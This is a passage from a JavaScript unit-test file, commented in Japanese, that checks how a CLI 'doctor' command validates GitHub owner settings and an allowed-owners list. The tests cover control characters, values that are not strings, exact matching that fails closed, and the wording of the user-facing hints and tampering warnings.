          assert.match(ownerRequirement.hint, /制御文字（画面に表示できない文字）だけの値/);
        } else {
          assert.match(ownerRequirement.hint, /文字列のオーナー名になっていません/);
          assert.match(ownerRequirement.hint, /のように引用符で囲んだユーザー／組織名へ直して/);
        }
        // 判定は生の値の完全一致のまま。ただし **owner が使えない値のときは照合そのものを
        // 行わない**（String(['acme']) が 'acme' に化けて通る経路を止める。issue #261）。
        assert.equal(owners.ok, false);
        // 加工が起きたときだけフラグが立つ（見せられないことと、加工したことは別）。
        assert.equal(owners.displaySanitized, sanitized || undefined);
      },
    );
  });
}

test('runDoctor: 制御文字だけの owner は current で「使えません」まで言い切る', () => {
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: BEL } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      // 「状態・結果」の 2 段構え（他の空値表示 `（未設定・一切取り込まない）` と揃える）。
      // #261 で未充足へ倒したので、「設定はされているが値として使えない」まで言い切る
      //（❌ の隣で「表示できません」とだけ書くと、設定を書いた人が原因を探す先を見失う）。
      assert.equal(
        byId(runDoctor(options), 'github.owner').current,
        '（設定されていますが、値が制御文字のみでオーナー名として使えません）',
      );
    },
  );
});

test('runDoctor: 加工時の hint は原因から始まり、一覧への追加は後段に置く（issue #252 レビュー指摘）', () => {
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: 'vek\ntor-inc' } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const hint = byId(runDoctor(options), 'org.allowed_owners').hint;
      // 1 文目が原因の説明であること（従来の「一覧に追加してください」で始まらない）。
      assert.match(hint, /^config\.json の github\.owner に/);
      // 「まず直す」が「そのうえで追加」より前に来ていること。
      const fixAt = hint.indexOf('まず github.owner を制御文字の無い値へ直して');
      const addAt = hint.indexOf('org.allowed_owners に "vektor-inc" を追加');
      assert.ok(fixAt >= 0, '対処（owner を直す）が含まれること');
      assert.ok(addAt > fixAt, '一覧への追加は対処より後ろに置くこと');
      // #252 の核心（表示は一致して見えるのに未充足）は削らない。
      assert.match(hint, /一覧と同じ名前に見えますが/);
      // ⚠️ ブロックと重複する記述は持たない（用語の言い換え・出所を疑う一文）。
      assert.doesNotMatch(hint, /画面には表示されない文字/);
      assert.doesNotMatch(hint, /出所そのものを疑って/);
      // 句点直後に半角スペースを入れない（末尾追記をやめたので発生しない）。
      assert.doesNotMatch(hint, /。 /);
    },
  );
});

test('formatDoctorReport: 加工があれば必須充足でも締めに警告を出す（issue #252 レビュー指摘）', () => {
  // 許可オーナー一覧の側だけに制御文字がある構成。必須項目はすべて充足するので、
  // 要件ごとの hint はどこにも出ない＝この警告が無いと注記の意味が誰にも伝わらない。
  withDoctorEnv(
    {
      queueBackend: 'local',
      config: {},
      allowedOwners: ['vektor-inc', `other${BEL}`],
    },
    (options) => {
      const reqs = runDoctor(options);
      const summary = summarizeDoctor(reqs);
      assert.equal(summary.allRequiredOk, true, '前提: 必須項目はすべて充足していること');
      const report = formatDoctorReport(reqs, summary);
      assert.match(report, /画面には表示されない文字（制御文字）が含まれていた/);
      assert.match(report, /設定ファイルの出所そのものを疑って/);
      // 参照先はファイル名の列挙ではなく「注記が付いた項目」。加工は config.json 以外
      // （VK Terminals のパス・版の記録ファイル）でも起きるので、列挙すると漏れが嘘になる。
      // 参照先は「doctor の一覧」。`up` は要件一覧を出さないので「上の一覧」だと
      // 加工が充足済みの行だけで起きたとき、どこにも無いものを指すことになる。
      assert.match(report, /doctor の一覧で注記が付いた項目の値を/);
      // 利用者が開いて直せるファイルとは限らない（VK Terminals のパスなど）ので言い切らない。
      assert.doesNotMatch(report, /その設定元のファイル/);
      // 充足時の締め（up 案内）も従来どおり出ること。ただし ⚠️ を出したまま全面 GO にしない
      // （端末では最終行が最後の印象になる）。条件を先に置いた 1 文にする。
      assert.match(report, /vk-orchestrator up/);
      assert.equal(
        report.trimEnd().split('\n').at(-1),
        '   上の ⚠️ を確認してから `vk-orchestrator up` で起動してください。',
      );
      // 警告を足しても要件行の本数は変わらない。
      assert.equal(countRequirementLines(report), reqs.length);
    },
  );
});

test('formatDisplaySanitizedWarning: doctor と up で同じ文言を共有する（字下げだけ変わる）', () => {
  // up の未充足警告は formatDoctorReport を通らない。文言を別々に持つと、同じ状態なのに
  // 経路で伝わる情報が食い違い、加工時の hint が寄りかかっている前提（このブロックが必ず出る）
  // も崩れる。共有していること自体をテストで固定する。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: 'vek\ntor-inc' } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const reqs = runDoctor(options);
      const plain = formatDisplaySanitizedWarning(reqs);
      // 字下げは空白の個数（数値）で受ける。任意の文字列を許すと、後から変数を繋いだときに
      // 改行入りの値で固定文言の中へ行を生やせてしまうため。
      const indented = formatDisplaySanitizedWarning(reqs, { indent: 2 });
      assert.equal(indented, plain.split('\n').map((line) => `  ${line}`).join('\n'));
      // 数値で受けている＝改行を混ぜられない（行数は常に 2 行のまま）。
      assert.equal(indented.split('\n').length, 2);
      // #252 の主眼（加工は改竄の痕跡でありうる）を伝える一文は、どちらの経路にも載る。
      assert.match(plain, /設定ファイルの出所そのものを疑って/);
      // doctor のレポートは同じ文言をそのまま埋め込む（二重管理にしない）。
      assert.ok(formatDoctorReport(reqs).includes(plain));
    },
  );
});

test('formatDisplaySanitizedWarning: 加工が無ければ空文字（呼び出し側が真偽値で扱える）', () => {
  withDoctorEnv({ queueBackend: 'local', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(formatDisplaySanitizedWarning(runDoctor(options)), '');
  });
});

test('formatDoctorReport: 加工が無ければ制御文字の警告も up 行の但し書きも出さない', () => {
  withDoctorEnv({ queueBackend: 'local', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    const report = formatDoctorReport(runDoctor(options));
    assert.doesNotMatch(report, /制御文字/);
    // 締めは従来の文言のまま（1 文字も変えない）。
    assert.match(report, /^ {3}`vk-orchestrator up` で起動できます。$/m);
    assert.doesNotMatch(report, /上の ⚠️ を確認/);
  });
});

test('runDoctor: 加工が起きない通常ケースでは表示も要件オブジェクトも従来どおり（ノイズを足さない）', () => {
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: {
        github: { owner: 'acme', repo: 'queue' },
        orchestrator: { assigneeFilter: 'me' },
      },
      allowedOwners: ['acme', 'other'],
    },
    (options) => {
      const reqs = runDoctor(options);
      // 加工していない行にはフラグ自体を生やさない（--json の出力を 1 バイトも変えない）。
      for (const r of reqs) {
        assert.ok(
          !Object.hasOwn(r, 'displaySanitized'),
          `${r.id} に displaySanitized を生やさないこと`,
        );
      }
      // 表示値は #248 以前と同じ（注記が混ざらない）。
      assert.equal(byId(reqs, 'github.owner').current, 'acme');
      assert.equal(byId(reqs, 'github.repo').current, 'queue');
      assert.equal(byId(reqs, 'orchestrator.assigneeFilter').current, 'me');
      // 一覧だけは要素の境界が読めるよう引用符で括る（issue #260。注記は付かないまま）。
      assert.equal(byId(reqs, 'org.allowed_owners').current, '"acme", "other"');
      assert.equal(byId(reqs, 'org.allowed_owners').label, 'org.allowed_owners に "acme" を含む');
      assert.doesNotMatch(byId(reqs, 'org.allowed_owners').hint, /制御文字/);
      // レポート本文にも注記が現れない。
      assert.doesNotMatch(formatDoctorReport(reqs), /制御文字/);
    },
  );
});

// ---------------------------------------------------------------------------
// 許可オーナー一覧の要素境界（issue #260）
//
// 一覧を `, ` で 1 行に連結して見せると、要素の中に `, ` が入っていたとき
// 「区切り」と「値の一部」を見分けられない。`org.allowed_owners: ["acme, evil"]`
// （1 要素）と `["acme", "evil"]`（2 要素）が同じ表示になるため、前者で
// `github.owner: "evil"` を診断すると「一覧に evil が並んでいるのに ❌」という
// #252 と同型の自己矛盾に見え、doctor のバグだと受け取られて真因へ辿り着けない。
// **判定（完全一致）は正しいので変えず、表示だけで境界を読めるようにする。**
// ---------------------------------------------------------------------------

// 一覧だけを差し替えて org.allowed_owners 要件を取り出すヘルパ（owner は固定）。
function allowedOwnersRequirement(allowedOwners, owner = 'evil') {
  return withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner } }, allowedOwners },
    (options) => byId(runDoctor(options), 'org.allowed_owners'),
  );
}

test('runDoctor: 一覧の要素は引用符で括り、値の中の `, ` と区切りを見分けられる（issue #260）', () => {
  const owners = allowedOwnersRequirement(['acme, evil']);
  // 判定は従来どおり完全一致。"evil" という要素は無いので未充足のまま（fail-open にしない）。
  assert.equal(owners.ok, false);
  // 表示は「1 要素の値が `acme, evil`」と読める形になっていること。
  assert.equal(owners.current, '"acme, evil"');
  // 加工はしていないので注記もフラグも付かない（#252 の注記とは別の話）。
  assert.doesNotMatch(owners.current, /制御文字/);
  assert.equal(owners.displaySanitized, undefined);
});

test('runDoctor: 要素数の違う一覧が同じ表示にならない（issue #260 の自己矛盾の再現）', () => {
  const oneElement = allowedOwnersRequirement(['acme, evil']);
  const twoElements = allowedOwnersRequirement(['acme', 'evil']);
  // 判定はもともと割れている（1 要素側だけ未充足）。
  assert.equal(oneElement.ok, false);
  assert.equal(twoElements.ok, true);
  // 表示も同じく割れていること（判定と表示が同じ結論を指す）。
  assert.notEqual(
    oneElement.current,
    twoElements.current,
    '要素数が違えば表示も違うこと（同じだと ❌ の理由が読み取れない）',
  );
  assert.equal(twoElements.current, '"acme", "evil"');
});

test('runDoctor: 値に引用符が含まれても囲いを閉じられない（表示の境界を壊さない）', () => {
  const owners = allowedOwnersRequirement(['ac"me, evil', 'evil']);
  // 一覧に "evil" が要素として存在するので判定は充足（表示の話と混ざらないことの確認）。
  assert.equal(owners.ok, true);
  // 値の中の `"` はエスケープされ、囲いとしての引用符は要素数 × 2 個のまま。
  assert.equal(owners.current, `${JSON.stringify('ac"me, evil')}, "evil"`);
  const fences = owners.current.replace(/\\./g, '').match(/"/g) ?? [];
  assert.equal(fences.length, 4, '囲いを閉じるのは製品側だけ（値の側から増やせない）');
});

test('runDoctor: 一覧の要素が加工されたら注記は引用符の外に 1 度だけ付く（#260 と #252 の両立）', () => {
  const owners = allowedOwnersRequirement(['acme', `ot${BEL}her`, `ye${BEL}t`], 'acme');
  assert.equal(owners.ok, true);
  // 引用符の中は値だけ（注記を値の一部に読ませない）。注記は末尾に 1 度だけ。
  assert.equal(owners.current, '"acme", "other", "yet"（表示のため制御文字を除去）');
  assert.equal(owners.current.match(/制御文字を除去/g).length, 1);
  // どれか 1 要素でも加工されればフラグが立つ。
  assert.equal(owners.displaySanitized, true);
});

test('runDoctor: 一覧の要素に owner が埋め込まれているとき hint が真因（1 オーナー = 1 要素）を指す（issue #260）', () => {
  const owners = allowedOwnersRequirement(['acme, evil']);
  assert.equal(owners.ok, false);
  // 1 文目が原因の説明（既定文の「一覧に追加してください」で始まらない）。
  assert.match(owners.hint, /^一覧の中に "evil" を含む要素がありますが/);
  assert.match(owners.hint, /1 個の要素として書かれていると一致しません/);
  // 「まず書き方を確認」が「そのうえで追加」より前に来ていること（#252 と同じ順序）。
  const checkAt = owners.hint.indexOf('「1 オーナー = 1 要素」になっているか確認');
  const addAt = owners.hint.indexOf('org.allowed_owners に "evil" を追加');
  assert.ok(checkAt >= 0, '書き方の確認が含まれること');
  assert.ok(addAt > checkAt, '一覧への追加は書き方の確認より後ろに置くこと');
  // label は既定のまま（加工は起きておらず、直す先は owner ではなく一覧の書き方）。
  assert.equal(owners.label, 'org.allowed_owners に "evil" を含む');
  assert.equal(owners.displaySanitized, undefined);
});

test('runDoctor: 部分一致する要素が無い通常の未充足では従来の hint のまま（案内を増やさない）', () => {
  const owners = allowedOwnersRequirement(['acme', 'other']);
  assert.equal(owners.ok, false);
  assert.match(owners.hint, /^vk-agents 正本 config の org\.allowed_owners に "evil" を追加してください/);
  assert.doesNotMatch(owners.hint, /1 個の要素として/);
});

test('runDoctor: 埋め込みの検知は hint の出し分け専用で、判定は完全一致のまま（ゲートをバイパスさせない）', () => {
  // 検知を判定に流用すると `["vektor-inc, evilcorp"]` で evilcorp 側も通ることになる
  // （rules/repository-access.md が禁じている部分一致）。案内が出ても ok は false のまま。
  const owners = allowedOwnersRequirement(['vektor-inc, evilcorp'], 'vektor-inc');
  assert.equal(owners.ok, false);
  assert.match(owners.hint, /一覧の中に "vektor-inc" を含む要素がありますが/);
});

test('runDoctor: ハイフン連結の別オーナー名では埋め込みの案内を出さない（既定 hint のまま）', () => {
  // `vektor-inc-clone` は「2 つのオーナー名を 1 個の要素に書いた」形ではないので、
  // そう断定する案内を出すと事実と食い違い、原因から遠ざける。区切りで割って一致した
  // ときだけ発火させ、ここでは既定の hint に戻す。ok は当然 false のまま。
  const owners = allowedOwnersRequirement(['vektor-inc-clone'], 'vektor-inc');
  assert.equal(owners.ok, false);
  assert.match(owners.hint, /^vk-agents 正本 config の org\.allowed_owners に "vektor-inc" を追加してください/);
  assert.doesNotMatch(owners.hint, /1 個の要素として/);
});

// 区切りに入れるのは owner 名（英数字とハイフン）に現れない文字だけ。人が書き間違える形を
// 拾いつつ、ハイフンを入れないこと（誤検知が戻る）を並べて固定する。
for (const { name, separator } of [
  { name: '半角カンマ＋空白', separator: ', ' },
  { name: '半角カンマのみ', separator: ',' },
  { name: '半角スペース', separator: ' ' },
  { name: '全角スペース', separator: '　' },
  { name: '読点', separator: '、' },
  { name: '全角カンマ', separator: '，' },
  { name: 'セミコロン', separator: '; ' },
]) {
  test(`runDoctor: ${name}で 1 要素にまとめられていても埋め込みとして検知する`, () => {
    const owners = allowedOwnersRequirement([`acme${separator}evil`]);
    assert.equal(owners.ok, false);
    assert.match(owners.hint, /^一覧の中に "evil" を含む要素がありますが/);
  });
}

test('runDoctor: 埋め込みの hint は分割の前に出所を疑う一文を挟む（#252 と同じ発想）', () => {
  // この案内は「まとまっている名前を分けてください」と読めるため、正本 config へ
  // `"vektor-inc, evilcorp"` を仕込まれていた場合に利用者の手で evilcorp を正規の要素へ
  // 昇格させる筋道になりうる。手を動かす前に一度止める一文を、対処と同じ段に置く。
  const owners = allowedOwnersRequirement(['vektor-inc, evilcorp'], 'vektor-inc');
  assert.match(owners.hint, /見覚えのないオーナー名が一緒に書かれていたら、分割せず設定ファイルの出所そのものを疑って/);
  // 文言は #252 側（formatDisplaySanitizedWarning）の言い回しに揃える。
  assert.ok(
    formatDisplaySanitizedWarning([{ displaySanitized: true }]).includes('設定ファイルの出所そのものを疑って'),
    '前提: #252 側と同じ言い回しであること',
  );
  // 位置は「書き方の確認」の後・「一覧へ追加」の前（分割し終えた後に読ませない）。
  const checkAt = owners.hint.indexOf('になっているか確認');
  const doubtAt = owners.hint.indexOf('見覚えのないオーナー名が');
  const addAt = owners.hint.indexOf('org.allowed_owners に "vektor-inc" を追加');
  assert.ok(checkAt >= 0 && doubtAt > checkAt && addAt > doubtAt, `想定の順序に並ぶこと: ${owners.hint}`);
});

test('runDoctor: 制御文字入り owner では #252 の hint が優先される（分岐の順序を崩さない）', () => {
  // 生の値どうしでは埋め込みが成立する（`acme, evil<BEL>` は `evil<BEL>` を含む）が、
  // 先に直すべきは owner 側の制御文字なので #252 の案内が勝つこと。
  const owners = allowedOwnersRequirement(['acme, ' + `evil${BEL}`], `evil${BEL}`);
  assert.equal(owners.ok, false);
  assert.match(owners.hint, /^config\.json の github\.owner に制御文字が混ざっています/);
  assert.doesNotMatch(owners.hint, /1 個の要素として/);
  assert.equal(owners.displaySanitized, true);
});

test('runDoctor: 文字列でない owner では埋め込みの案内を出さない（見せられない値を一覧の話にしない）', () => {
  // String({}) は '[object Object]' に化けるだけ。`o.includes(owner)` は生の値
  // （オブジェクト）で false になるが、ガードが外れると「一覧の中に "" を含む要素が」
  // という壊れた案内へ落ちうるので、型のガードごと固定する。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: {} } }, allowedOwners: ['acme, evil'] },
    (options) => {
      const reqs = runDoctor(options);
      const owners = byId(reqs, 'org.allowed_owners');
      assert.equal(owners.ok, false);
      assert.doesNotMatch(owners.hint, /1 個の要素として/);
      // 原因の説明は github.owner 側にある（#261 でこの行は依存だけを伝える形になった）。
      assert.match(byId(reqs, 'github.owner').hint, /文字列のオーナー名になっていません/);
    },
  );
});

// ---------------------------------------------------------------------------
// 使えない設定値は未充足として数える（issue #261）
//
// 従来の判定（hasNonEmpty）は「空文字でなければ設定済み」だったため、制御文字だけの値や
// 文字列で書かれていない値（`[]` / `{}` / 数値 / 真偽値 / `["acme"]`）まで充足と数えていた。
// これらは実際には GitHub オーナー名として使えず、**doctor が「すべて設定済み」と言った
// 直後にタスクが 1 件も流れない**。充足数が表しているのは「設定を書いた項目の数」ではなく
// 「このまま起動して進む見込み」なので、進まない値は充足から外す。
//
// 判定に使う条件は AND で足すだけ（型が文字列であること・制御文字を除いても文字が残ること）。
// **加工結果は充足を取り消す根拠にだけ使い、与える根拠には使わない**ので、❌ → ✅ へ動く
// 経路は増えない。許可オーナー一覧との照合は従来どおり生の値の完全一致のまま。
// ---------------------------------------------------------------------------

// 未充足へ倒す 2 状態（undisplayable / invalid-type）を網羅する入力。
// 表示では値そのものを出さず「種類の名前」だけを出す（`[object Object]` は利用者の
// config.json に存在しない文字列なので、探しに行かせないために絶対に出さない）。
const UNUSABLE_CONFIG_VALUES = [
  { name: '制御文字のみ', value: BEL, sanitized: true, currentNote: '値が制御文字のみで' },
  { name: '空配列', value: [], typeName: '配列' },
  { name: 'オブジェクト', value: {}, typeName: 'オブジェクト' },
  { name: '要素が 1 つの配列', value: ['acme'], typeName: '配列' },
  { name: '数値', value: 123, typeName: '数値' },
  { name: '真偽値', value: true, typeName: '真偽値' },
];

for (const { name, value, typeName, currentNote } of UNUSABLE_CONFIG_VALUES) {
  test(`runDoctor: ${name}の設定値は充足から外す（issue #261）`, () => {
    withDoctorEnv(
      {
        queueBackend: 'github',
        config: {
          github: { owner: value, repo: value },
          orchestrator: { assigneeFilter: value },
        },
        // 化けた値が一致しうる要素をあえて一覧に入れておく（`["acme"]` → 'acme'）。
        allowedOwners: ['vektor-inc', 'acme'],
      },
      (options) => {
        const reqs = runDoctor(options);
        assert.equal(byId(reqs, 'github.owner').ok, false);
        assert.equal(byId(reqs, 'orchestrator.assigneeFilter').ok, false);
        // repo は未設定なら従来どおり ✅（既定 task-queue が有効）。書いてあるのに
        // 使えない値のときだけ ❌ にする。
        assert.equal(byId(reqs, 'github.repo').ok, false);
        // owner が使える値になるまで照合そのものを行わない（fail-close）。
        assert.equal(byId(reqs, 'org.allowed_owners').ok, false);

        // **どの状態でも値の欄が空・空白のみにならない**（`…` の右が空で終わる行を作らない）。
        // formatDoctorReport 側の `|| '…'` のような防御ではなく、値の側で必ず非空にする。
        for (const r of reqs) {
          assert.match(r.current, /\S/, `${r.id} の current が非空であること`);
        }
        // 内部表現（[object Object]）は表示のどこにも出さない。
        for (const r of reqs) {
          for (const field of ['current', 'label', 'hint']) {
            assert.ok(!r[field].includes('[object Object]'), `${r.id} の ${field}: ${r[field]}`);
          }
        }

        // 「未設定」とは別の受け皿。値そのものは出さず、種類の名前だけを出す。
        for (const id of ['github.owner', 'github.repo', 'orchestrator.assigneeFilter']) {
          const current = byId(reqs, id).current;
          assert.match(current, /^（設定されていますが、/, `${id}: ${current}`);
          assert.doesNotMatch(current, /未設定/, `${id}: ${current}`);
          if (typeName) assert.ok(current.endsWith(`文字列ではありません: ${typeName}）`), current);
          else assert.ok(current.includes(currentNote), current);
        }
      },
    );
  });
}

test('runDoctor: 使えない値の hint は「設定してください」ではなく状態ごとの対処を出す（issue #261）', () => {
  // 既存の汎用 hint（「〜に自分のユーザー／組織名を設定してください（既定 vektor-inc の
  // ままだと…）」）は、設定を書いた自覚がある人には噛み合わない（後半は無関係）。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: BEL } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const hint = byId(runDoctor(options), 'github.owner').hint;
      assert.equal(
        hint,
        'config.json の github.owner が制御文字（画面に表示できない文字）だけの値になっています。'
          + 'この値ではオーナー名として使えないため、まず github.owner を正しいユーザー／組織名へ直してください。',
      );
    },
  );
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: [] } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const hint = byId(runDoctor(options), 'github.owner').hint;
      assert.equal(
        hint,
        'config.json の github.owner が、文字列のオーナー名になっていません（現在は配列）。'
          + 'まず github.owner を "vektor-inc" のように引用符で囲んだユーザー／組織名へ直してください。',
      );
      // 既定値の案内（設定を書いた人には噛み合わない）は出さない。
      assert.doesNotMatch(hint, /既定 vektor-inc のままだと/);
    },
  );
});

test('runDoctor: 使えない値の hint は共有ヘルパーで組み立て、キー名だけが入れ替わる（issue #261）', () => {
  // 3 か所へ手書きすると語調が割れる。同じ形の文をヘルパーで生成していることを、
  // 「自分のキー名しか出てこない」ことで固定する。
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: { github: { repo: [] }, orchestrator: { assigneeFilter: [] } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      for (const id of ['github.repo', 'orchestrator.assigneeFilter']) {
        const hint = byId(reqs, id).hint;
        assert.match(hint, new RegExp(`^config\\.json の ${id.replace('.', '\\.')} が、文字列の`));
        assert.match(hint, /（現在は配列）/);
        assert.match(hint, /のように引用符で囲んだ/);
        // 別のキーの話に化けない（コピペで語調と一緒にキー名まで持ってこない）。
        assert.ok(!hint.includes('github.owner'), hint);
      }
    },
  );
});

test('runDoctor: owner が使えない値のとき org.allowed_owners は依存だけを伝える（issue #261）', () => {
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: [] } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const owners = byId(runDoctor(options), 'org.allowed_owners');
      assert.equal(
        owners.hint,
        'まず上の「GitHub オーナー（github.owner）」を直してください。'
          + 'github.owner が使える値になるまで、org.allowed_owners との照合ができません（一覧そのものは変更不要です）。',
      );
      // 許可オーナー一覧＝セキュリティ境界。反射的に項目を足させないための一文は必須。
      assert.match(owners.hint, /一覧そのものは変更不要です/);
      assert.doesNotMatch(owners.hint, /追加してください/);
      // label は #252 で入った中立形のまま（引用符で "" や "[object Object]" を見せない）。
      assert.equal(owners.label, 'org.allowed_owners に github.owner の値を含む');
    },
  );
});

test('formatDoctorReport: 空配列の設定値でも値の欄が空のまま終わる行が無い（issue #261）', () => {
  // `…` は「この後に値が来る」という約束なので、空で終わると印刷が途中で切れたようにも
  // 「値が空文字」とも読めて状態が確定しない。行末での空欄を直接禁止する。
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: { github: { owner: [], repo: [] }, orchestrator: { assigneeFilter: [] } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const report = formatDoctorReport(runDoctor(options));
      for (const line of report.split('\n')) {
        assert.doesNotMatch(line, /…\s*$/, `値の欄が空のまま終わる行が無いこと: ${line}`);
      }
    },
  );
});

test('formatDoctorReport: オブジェクトの設定値でも [object Object] を出さない（issue #261）', () => {
  // 利用者の config.json のどこにも存在しない文字列なので、出すと設定ファイルの中に
  // 無いものを探しに行かせることになる。
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: { github: { owner: {}, repo: {} }, orchestrator: { assigneeFilter: {} } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      assert.doesNotMatch(formatDoctorReport(runDoctor(options)), /\[object Object\]/);
    },
  );
});

test('runDoctor: 化けて一致していた値は照合を通さない（["acme"] / 制御文字。issue #261）', () => {
  // String(['acme']) は 'acme' に化けるため、従来は一覧に 'acme' があると充足していた。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: ['acme'] } }, allowedOwners: ['acme'] },
    (options) => {
      const reqs = runDoctor(options);
      assert.equal(byId(reqs, 'github.owner').ok, false);
      assert.equal(byId(reqs, 'org.allowed_owners').ok, false);
    },
  );
  // 一覧側に同じ制御文字が書かれていても通さない（生の値どうしでは一致してしまう経路）。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: BEL } }, allowedOwners: [BEL] },
    (options) => {
      assert.equal(byId(runDoctor(options), 'org.allowed_owners').ok, false);
    },
  );
});

test('runDoctor: 使えない owner は既定 vektor-inc に化けない（fail-open にしない。issue #261）', () => {
  // 「値が入っているか」で既定値へ切り替える分岐をそのまま置き換えると、壊れた値が既定の
  // vektor-inc に化けて許可オーナー一覧の照合を通る（今より緩む）。既定へ戻すのは
  // **本当に未設定のときだけ**。
  withDoctorEnv(
    { queueBackend: 'github', config: { github: { owner: [] } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const owners = byId(runDoctor(options), 'org.allowed_owners');
      assert.equal(owners.ok, false, '壊れた owner が既定値に化けて照合を通らないこと');
    },
  );
  // 未設定のときは従来どおり既定値で照合する（この経路は 1 文字も変えない）。
  withDoctorEnv(
    { queueBackend: 'github', config: {}, allowedOwners: ['vektor-inc'] },
    (options) => {
      const reqs = runDoctor(options);
      assert.equal(byId(reqs, 'org.allowed_owners').ok, true);
      assert.equal(byId(reqs, 'github.owner').current, '（未設定・既定 vektor-inc）');
      assert.equal(
        byId(reqs, 'github.owner').hint,
        'config.json の github.owner に自分のユーザー／組織名を設定してください（既定 vektor-inc のままだと他組織のキューを見に行きます）。',
      );
    },
  );
});

test('runDoctor: 未設定の github.repo は従来どおり充足のまま（既定 task-queue が有効）', () => {
  withDoctorEnv({ queueBackend: 'github', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    const repo = byId(runDoctor(options), 'github.repo');
    assert.equal(repo.ok, true);
    assert.equal(repo.current, 'task-queue（既定）');
  });
});

test('runDoctor: 制御文字だけの値でも ⚠️ の注意書きは消えない（#252 の成果を残す）', () => {
  // ownerAltered の第 1 項を「使えるか」にすると displaySanitized が落ち、改竄の痕跡を
  // 伝える一文がレポートから消える。ここは「設定が存在するか」で見る。
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: { github: { owner: BEL, repo: BEL }, orchestrator: { assigneeFilter: BEL } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      for (const id of ['github.owner', 'github.repo', 'orchestrator.assigneeFilter']) {
        assert.equal(byId(reqs, id).ok, false, `${id} の ok`);
        assert.equal(byId(reqs, id).displaySanitized, true, `${id} の displaySanitized`);
      }
      const report = formatDoctorReport(reqs);
      assert.match(report, /画面には表示されない文字（制御文字）が含まれていた/);
      assert.match(report, /設定ファイルの出所そのものを疑って/);
    },
  );
});

test('runDoctor: 文字列でない値では制御文字の注記も警告も出さない（判定順は 型 → 制御文字）', () => {
  // `["a\nb"]` は String() の結果に制御文字が残るため、型を先に見ないと「文字列ではない」
  // のに制御文字の警告が出る。あの文面は「画面に表示されない文字が含まれていた」と断言する
  // ので、`[]` や `["a\nb"]` に対して出すと嘘になる（滅多に出ないことが警告の機能でもある）。
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: { github: { owner: ['a\nb'], repo: ['a\nb'] }, orchestrator: { assigneeFilter: ['a\nb'] } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      for (const id of ['github.owner', 'github.repo', 'orchestrator.assigneeFilter']) {
        assert.equal(byId(reqs, id).displaySanitized, undefined, `${id} に注記フラグを立てない`);
      }
      assert.equal(formatDisplaySanitizedWarning(reqs), '');
      assert.doesNotMatch(formatDoctorReport(reqs), /制御文字/);
    },
  );
});

test('runDoctor: 制御文字が混ざっているだけの値は従来どおり充足のまま（issue #261 の境界）', () => {
  // 境界は「制御文字を取り除いた後に 1 文字も残らないか」だけ。取り除いても文字が残る値は
  // ✅ のまま＝正しく設定している利用者の表示は 1 文字も変わらない。
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: {
        github: { owner: 'vek\ntor-inc', repo: 'que\nue' },
        orchestrator: { assigneeFilter: 'm\ne' },
      },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      assert.equal(byId(reqs, 'github.owner').ok, true);
      assert.equal(byId(reqs, 'github.repo').ok, true);
      assert.equal(byId(reqs, 'orchestrator.assigneeFilter').ok, true);
      // 判定は生の値のままなので、許可オーナー一覧との照合は通さない（fail-close 維持）。
      assert.equal(byId(reqs, 'org.allowed_owners').ok, false);
      assert.equal(byId(reqs, 'github.owner').displaySanitized, true);
    },
  );
});

test('runDoctor: 正常な値では表示も判定も 1 文字も変わらない（issue #261）', () => {
  withDoctorEnv(
    {
      queueBackend: 'github',
      config: {
        github: { owner: 'acme', repo: 'queue' },
        orchestrator: { assigneeFilter: 'me' },
      },
      allowedOwners: ['acme'],
    },
    (options) => {
      const reqs = runDoctor(options);
      assert.equal(summarizeDoctor(reqs).allRequiredOk, true);
      assert.equal(byId(reqs, 'github.owner').current, 'acme');
      assert.equal(byId(reqs, 'github.repo').current, 'queue');
      assert.equal(byId(reqs, 'orchestrator.assigneeFilter').current, 'me');
      assert.equal(byId(reqs, 'org.allowed_owners').label, 'org.allowed_owners に "acme" を含む');
      // 新しい受け皿の文言はどこにも現れない（正常時にノイズを足さない）。
      assert.doesNotMatch(formatDoctorReport(reqs), /設定されていますが/);
    },
  );
});

test('summarizeDoctor: 全 required 充足で allRequiredOk=true（ローカルモード最小構成）', () => {
  withDoctorEnv({ queueBackend: 'local', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    const summary = summarizeDoctor(runDoctor(options));
    assert.equal(summary.allRequiredOk, true);
    assert.equal(summary.missingRequired.length, 0);
  });
});

test('summarizeDoctor: 必須欠損があると allRequiredOk=false・missingRequired に列挙する', () => {
  withDoctorEnv({ queueBackend: 'github', config: {}, ghAuthenticated: false }, (options) => {
    const summary = summarizeDoctor(runDoctor(options));
    assert.equal(summary.allRequiredOk, false);
    const ids = summary.missingRequired.map((r) => r.id);
